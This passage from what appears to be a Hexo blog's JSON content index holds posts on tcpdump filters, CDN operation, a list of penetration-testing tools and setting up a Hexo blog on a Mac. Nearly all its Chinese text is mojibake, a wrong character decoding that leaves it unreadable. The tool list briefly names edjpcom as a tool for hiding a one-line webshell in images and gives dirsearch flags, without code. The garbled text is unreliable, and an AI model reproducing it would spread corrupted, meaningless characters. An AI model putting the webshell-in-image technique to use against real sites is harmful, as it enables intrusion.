src , dst ,dst or src, dst and src å…³äºåè®®çš„å…³é”®å­—ï¼Œä¸»è¦åŒ…æ‹¬ ether,ip,ip6,arp,rarp,tcp,udp ç­‰ç±»å‹,å¦‚æˆ‘ä»¬åªæƒ³æŠ“ tcp çš„åŒ…å‘½ä»¤ä¸º: sudo tcpdump -i eth0 -nn -c1 â€˜tcpâ€™","categories":[{"name":"å·¥å…·ä½¿ç”¨","slug":"å·¥å…·ä½¿ç”¨","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"å·¥å…·ä½¿ç”¨","slug":"å·¥å…·ä½¿ç”¨","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}]},{"title":"CDN","slug":"CDNè®²è§£","date":"2021-02-15T12:25:45.000Z","updated":"2021-03-20T14:19:07.291Z","comments":true,"path":"2021/02/15/CDNè®²è§£/","link":"","permalink":"http://example.com/2021/02/15/CDN%E8%AE%B2%E8%A7%A3/","excerpt":"","text":"ä»€ä¹ˆæ˜¯ CDN CDN å·¥ä½œåŸç†å†…å®¹åˆ†å‘ç½‘ç»œï¼ˆContent Delivery Networkï¼Œç®€ç§° CDNï¼‰æ˜¯å»ºç«‹å¹¶è¦†ç›–åœ¨æ‰¿è½½ç½‘ä¹‹ä¸Šï¼Œç”±åˆ†å¸ƒåœ¨ä¸åŒåŒºåŸŸçš„è¾¹ç¼˜èŠ‚ç‚¹æœåŠ¡å™¨ç¾¤ç»„æˆçš„åˆ†å¸ƒå¼ç½‘ç»œ æœ€ç®€å•çš„ CDN å¯ä»¥é€šè¿‡ä¸€ä¸ª DNS æœåŠ¡å™¨å’Œå¤šä¸ªç¼“å­˜æœåŠ¡å™¨ç»„æˆã€‚ ä¾‹å­è®²è§£å‡è®¾é€šè¿‡ CDN åŠ é€Ÿçš„åŸŸåä¸ºwww.a.comï¼Œæ¥å…¥CDNç½‘ç»œï¼Œå¼€å§‹ä½¿ ç”¨åŠ é€ŸæœåŠ¡åï¼Œå½“ç»ˆç«¯ç”¨æˆ·ï¼ˆåŒ—äº¬ï¼‰å‘èµ· HTTP è¯·æ±‚æ—¶ï¼Œå¤„ç†æµç¨‹å¦‚ä¸‹ï¼š å½“ç»ˆç«¯ç”¨æˆ·ï¼ˆåŒ—äº¬ï¼‰å‘www.a.comä¸‹çš„æŒ‡å®šèµ„æºå‘èµ·è¯·æ±‚æ—¶ï¼Œé¦–å…ˆå‘LDNSï¼ˆæœ¬åœ°DNSï¼‰å‘èµ·åŸŸåè§£æè¯·æ±‚ã€‚LDNSæ£€æŸ¥ç¼“å­˜ä¸­æ˜¯å¦æœ‰www.a.comçš„IPåœ°å€è®°å½•ã€‚å¦‚æœæœ‰ï¼Œåˆ™ç›´æ¥è¿”å›ç»™ç»ˆç«¯ç”¨æˆ·ï¼›å¦‚æœæ²¡æœ‰ï¼Œåˆ™å‘æˆæƒDNSæŸ¥è¯¢ã€‚ å½“æˆæƒ DNS è§£æwww.a.comæ—¶ï¼Œè¿”å›åŸŸåCNAME www.a.tbcdn.comå¯¹åº”IPåœ°å€ã€‚åŸŸåè§£æè¯·æ±‚å‘é€è‡³é˜¿é‡Œäº‘DNSè°ƒåº¦ç³»ç»Ÿï¼Œå¹¶ä¸ºè¯·æ±‚åˆ†é…æœ€ä½³èŠ‚ç‚¹IPåœ°å€ã€‚ LDNS è·å– DNS è¿”å›çš„è§£æ IP åœ°å€ã€‚ç”¨æˆ·è·å–è§£æ IP åœ°å€ã€‚ç”¨æˆ·å‘è·å–çš„ IP åœ°å€å‘èµ·å¯¹è¯¥èµ„æºçš„è®¿é—®è¯·æ±‚ã€‚ å¦‚æœè¯¥ IP åœ°å€å¯¹åº”çš„èŠ‚ç‚¹å·²ç¼“å­˜è¯¥èµ„æºï¼Œåˆ™ä¼šå°†æ•°æ®ç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œä¾‹å¦‚ï¼Œå›¾ä¸­æ­¥éª¤ 7 å’Œ 8ï¼Œè¯·æ±‚ç»“æŸã€‚å¦‚æœè¯¥ IP åœ°å€å¯¹åº”çš„èŠ‚ç‚¹æœªç¼“å­˜è¯¥èµ„æºï¼Œåˆ™èŠ‚ç‚¹å‘æºç«™å‘èµ·å¯¹è¯¥èµ„æºçš„è¯·æ±‚ã€‚è·å–èµ„æºåï¼Œç»“åˆç”¨æˆ·è‡ªå®šä¹‰é…ç½®çš„ç¼“å­˜ç­–ç•¥ï¼Œå°†èµ„æºç¼“å­˜è‡³èŠ‚ç‚¹ï¼Œä¾‹å¦‚ï¼Œå›¾ä¸­çš„åŒ—äº¬èŠ‚ç‚¹ï¼Œå¹¶è¿”å›ç»™ç”¨æˆ·ï¼Œè¯·æ±‚ç»“æŸã€‚ ä»è¿™ä¸ªä¾‹å­å¯ä»¥äº†è§£åˆ°ï¼šï¼ˆ1ï¼‰CDN çš„åŠ é€Ÿèµ„æºæ˜¯è·ŸåŸŸåç»‘å®šçš„ã€‚ï¼ˆ2ï¼‰é€šè¿‡åŸŸåè®¿é—®èµ„æºï¼Œé¦–å…ˆæ˜¯é€šè¿‡ DNS åˆ†æŸ¥æ‰¾ç¦»ç”¨æˆ·æœ€è¿‘çš„ CDN èŠ‚ç‚¹ï¼ˆè¾¹ç¼˜æœåŠ¡å™¨ï¼‰çš„ IPï¼ˆ3ï¼‰é€šè¿‡ IP è®¿é—®å®é™…èµ„æºæ—¶ï¼Œå¦‚æœ CDN ä¸Šå¹¶æ²¡æœ‰ç¼“å­˜èµ„æºï¼Œåˆ™ä¼šåˆ°æºç«™è¯·æ±‚èµ„æºï¼Œå¹¶ç¼“å­˜åˆ° CDN èŠ‚ç‚¹ä¸Šï¼Œè¿™æ ·ï¼Œç”¨æˆ·ä¸‹ä¸€æ¬¡è®¿é—®æ—¶ï¼Œè¯¥ CDN èŠ‚ç‚¹å°±ä¼šæœ‰å¯¹åº”èµ„æºçš„ç¼“å­˜äº†ã€‚","categories":[{"name":"çŸ¥è¯†æ™®åŠ","slug":"çŸ¥è¯†æ™®åŠ","permalink":"http://example.com/categories/%E7%9F%A5%E8%AF%86%E6%99%AE%E5%8F%8A/"}],"tags":[{"name":"çŸ¥è¯†æ™®åŠ","slug":"çŸ¥è¯†æ™®åŠ","permalink":"http://example.com/tags/%E7%9F%A5%E8%AF%86%E6%99%AE%E5%8F%8A/"}]},{"title":"Burp suit","slug":"å·¥å…·ä½¿ç”¨/å·¥å…·ä½¿ç”¨","date":"2020-11-26T11:53:43.000Z","updated":"2021-02-01T09:53:11.973Z","comments":true,"path":"2020/11/26/å·¥å…·ä½¿ç”¨/å·¥å…·ä½¿ç”¨/","link":"","permalink":"http://example.com/2020/11/26/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/","excerpt":"","text":"0x00å‰è¨€ä¸ç§¯è·¬æ­¥æ— ä»¥è‡³åƒé‡Œï¼Œ ä¸ç§¯å°æµæ— ä»¥æˆæ±Ÿæµ·ã€‚ è¿™é‡Œå¼€å§‹æˆ‘çš„å·¥å…·æ€»ç»“ä¹‹è·¯ 0x01 Burp suitå‚ç…§burp suitä½¿ç”¨è¯¦è§£ ç”±äºç»å¸¸ä½¿ç”¨burpï¼Œæ‰€ä»¥å°±ä¸åšäº† 0x02 beef1.ä»‹ç»2.ä½¿ç”¨ 0x03 dirb1.ä»‹ç»2.ä½¿ç”¨ å­—å…¸ç›®å½•åœ¨usr/share/wordlistsä¸‹ 0x04 dirbusterå·²ç»å¾ˆè¯¦ç»†äº†ã€‚ã€‚ 0x05 dirsearch -u æŒ‡å®šurl -e æŒ‡å®šç½‘ç«™è¯­è¨€ -w å¯ä»¥åŠ ä¸Šè‡ªå·±çš„å­—å…¸ï¼ˆå¸¦ä¸Šè·¯å¾„ï¼‰ -r é€’å½’æŸ¥æ‰¾ â€“random-agents ä½¿ç”¨ä»£ç†ï¼ˆä½¿ç”¨çš„ä»£ç†ç›®å½•åœ¨uesr-agents.txtä¸­ï¼Œå¯ä»¥è‡ªå·±æ·»åŠ ï¼‰ æŒºç®€å•çš„ã€‚æ³¨ï¼š-e *è¡¨ç¤ºæ²¡æœ‰è¯­è¨€è§„å®š 0x06 æ˜å°å­æˆ–è®¸ç”±äºå¤ªå¤è€ï¼Œæ‰€ä»¥æ²¡æœ‰æ‰¾åˆ° ä¸è¿‡çŸ¥é“æ˜¯ç”¨æ¥sqlæ³¨å…¥çš„ 0x07 edjpcomä¸»è¦æ˜¯æŠŠä¸€å¥è¯æœ¨é©¬æ’å…¥åˆ°å›¾ç‰‡ä¸­ï¼Œ ä½¿ç”¨ï¼š 0x08 Seayæºä»£ç å®¡è®¡ç³»ç»Ÿæ‰¾ä¸åˆ°ï¼Œä¸‹äº†ä¸ªç»¿è‰²ç½‘ç«™ä¸Šçš„ï¼Œå‘œå‘œã€‚ã€‚ã€‚","categories":[{"name":"å·¥å…·ä½¿ç”¨","slug":"å·¥å…·ä½¿ç”¨","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"å·¥å…·ä½¿ç”¨","slug":"å·¥å…·ä½¿ç”¨","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}]},{"title":"Macä¸‹åŸºäºGitHubçš„Hexoåšå®¢æ­å»º","slug":"my first blog","date":"2020-10-15T07:19:36.000Z","updated":"2021-03-24T15:48:43.533Z","comments":true,"path":"2020/10/15/my first blog/","link":"","permalink":"http://example.com/2020/10/15/my%20first%20blog/","excerpt":"","text":"Macä¸‹åŸºäºGitHubçš„Hexoåšå®¢æ­å»ºåŠæ›´æ¢ä¸»é¢˜ã€‚ï¼ˆå‘½ä»¤åŸºäºrootæƒé™ä¸‹ï¼‰ä¸€ã€node.jså®‰è£…ï¼ˆç”¨äºç”Ÿæˆé™æ€é¡µé¢ï¼‰ ç›´æ¥é€šè¿‡å®˜ç½‘ä¸‹è½½https://link.zhihu.com/?target=https%3A//nodejs.org/en/ï¼Œå¹¶ä¸”å®‰è£…ã€‚ é€šè¿‡node -væ¥æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸã€‚ äºŒã€Gitå®‰è£…åŠé…ç½®ï¼ˆå°†æœ¬åœ°å†…å®¹æäº¤åˆ°GitHubï¼ˆå·²æ³¨å†Œï¼‰ä¸Šï¼‰ åœ¨ç»ˆç«¯è¾“å…¥brew install gitæ¥ä¸‹è½½ï¼Œgit -væ£€æŸ¥å®‰è£…æˆåŠŸï¼ˆMacä¸‹brewå®‰è£…è¯¦è§ï¼‰ sshé…ç½®å…³è”GitHubä»“åº“è¯¦è§https://blog.csdn.net/linhai1028/article/details/81436825?biz_id=102&amp;utm_term=Mac%E4%B8%8Bgit&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-81436825&amp;spm=1018.2118.3001.4187 ä¸‰ã€hexoå®‰è£…ï¼ˆé€šè¿‡npmï¼‰ æ›´æ–°å®‰è£…æºï¼šnpm config set regitory https://regitory.npm.taobao.orgï¼ˆå¦‚ä¸æ›´æ¢ï¼Œå®‰è£…ä¼šå¡ä½ï¼‰ éªŒè¯æ˜¯å¦æ›´æ–°æˆåŠŸï¼šnpm config get regitory å®‰è£…cnpmï¼šnpm install -g cnpm --registry=https://registry.npm.taobao.org å®‰è£…hexoï¼šnpm install -g hexo-cli å››ã€hexoåˆå§‹åŒ– mkdir blog cd blog/ hexo init//hexoåˆå§‹åŒ– hexo gç”Ÿæˆé™æ€é¡µé¢,hexo sä¹‹åå³å¯è®¿é—®http://localhost:4000ï¼ˆä¸è¦åœæ­¢ç»ˆç«¯ï¼‰ äº”ã€hexoéƒ¨ç½²åˆ°GitHub è¿›å…¥blogæ–‡ä»¶å¤¹ï¼Œå¯ä»¥çœ‹åˆ°_ config.ymlæ–‡ä»¶(blogé…ç½®æ–‡ä»¶)ã€‚ æ‹‰åˆ°åº•éƒ¨ï¼Œé…ç½®å¦‚ä¸‹ï¼ˆrepsitoryæ˜¯ä»“åº“çš„åœ°å€ï¼‰ï¼š åœ¨blogä¸‹çš„ç»ˆç«¯è¾“å…¥npm install hexo-deployer-git --save è¾“å…¥ï¼š hexo clean hexo g hexo d å…­ã€å®Œæˆ æ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥https://xxx.github.ioï¼ˆxxxæ˜¯GitHubçš„ç”¨æˆ·åï¼‰ï¼Œå³å¯è®¿é—®ã€‚ æ›´æ¢ä¸»é¢˜(ä¼˜åŒ–é—®é¢˜ï¼Œä»¥åå†å†™å§)åœ¨bolgæ–‡ä»¶å¤¹çš„themesæ–‡ä»¶ä¸‹ä¸‹è½½ä¸»é¢˜ã€‚äºŒã€é…ç½®blogä¸‹çš„_config.ymlæ–‡ä»¶ä¸­çš„themeï¼Œé€‰æ‹©å¯¹åº”çš„ä¸»é¢˜ã€‚hexo så³å¯åœ¨æœ¬åœ°è®¿é—®ã€‚ hexo g,hexo d,ä¸Šä¼ GitHubã€‚ è¯¦è§https://easyhexo.com/","categories":[{"name":"å°é—®é¢˜","slug":"å°é—®é¢˜","permalink":"http://example.com/categories/%E5%B0%8F%E9%97%AE%E9%A2%98/"}],"tags":[{"name":"å°é—®é¢˜","slug":"å°é—®é¢˜","permalink":"http://example.com/tags/%E5%B0%8F%E9%97%AE%E9%A2%98/"}]}],"categories":[{"name":"CTFæ¯”èµ›","slug":"CTFæ¯”èµ›","permalink":"http://example.com/categories/CTF%E6%AF%94%E8%B5%9B/"},{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://example.com/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"å·¥å…·ä½¿ç”¨","slug":"å·¥å…·ä½¿ç”¨","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"name":"çŸ¥è¯†æ™®åŠ","slug":"çŸ¥è¯†æ™®åŠ","permalink":"http://example.com/categories/%E7%9F%A5%E8%AF%86%E6%99%AE%E5%8F%8A/"},{"name":"å°é—®é¢˜","slug":"å°é—®é¢˜","permalink":"http://example.com/categories/%E5%B0%8F%E9%97%AE%E9%A2%98/"}],"tags":[{"name":"CTFæ¯”èµ›","slug":"CTFæ¯”èµ›","permalink":"http://example.com/tags/CTF%E6%AF%94%E8%B5%9B/"},{"name":"upload","slug":"upload","permalink":"http://example.com/tags/upload/"},{"name":"xss","slug":"xss","permalink":"http://example.com/tags/xss/"},{"name":"sql","slug":"sql","permalink":"http://example.com/tags/sql/"},{"name":"å·¥å…·ä½¿ç”¨","slug":"å·¥å…·ä½¿ç”¨","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"name":"çŸ¥è¯†æ™®åŠ","slug":"çŸ¥è¯†æ™®åŠ","permalink":"http://example.com/tags/%E7%9F%A5%E8%AF%86%E6%99%AE%E5%8F%8A/"},{"name":"å°é—®é¢˜","slug":"å°é—®é¢˜","permalink":"http://example.com/tags/%E5%B0%8F%E9%97%AE%E9%A2%98/"}]}